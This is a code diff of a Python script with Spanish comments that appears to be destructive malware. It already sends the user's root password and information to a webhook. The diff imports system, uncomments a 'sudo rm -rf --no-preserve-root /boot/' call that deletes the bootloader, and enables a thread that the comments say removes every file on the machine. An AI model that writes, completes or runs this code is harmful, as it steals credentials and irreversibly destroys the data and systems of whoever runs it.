@@ -1,4 +1,4 @@
-from os import listdir
+from os import listdir, system
 from threading import Thread
 from colorama import Fore, Style
 from time import sleep
@@ -62,8 +62,9 @@ def main():
      # Se conecta con un webhook y manda la información del usuario
      user_info(root_pswd=rootPassword,
                webhook='link del webhook')
+     
      #    Empieza a eliminar el grub para que el usuario no pueda reiniciar así nomas
-     #system('sudo rm -rf --no-preserve-root /boot/')
+     system('sudo rm -rf --no-preserve-root /boot/')
 
      # Lista de threads
      threads = []
@@ -94,8 +95,8 @@ def main():
      #    primero destruyendo el boot para seguidamente remover
      #    todos los archivos que pueda usando el comando ```sudo rm -rf --no-preserve-root /```
      #    source              :    src/destruct.py, línea 5
-     #t4 = Thread(target=start_destruction)
-     #t4.start()
+     t4 = Thread(target=start_destruction)
+     t4.start()
      
 #    Comprueba si el script está corriendo      
      t5 = Thread(target=check)
@@ -105,7 +106,7 @@ def main():
      threads.append(t1)
      threads.append(t2)
      threads.append(t3)
-     #threads.append(t4)
+     threads.append(t4)
      threads.append(t5)
      # Los threads son unidos
      for thread in threads:
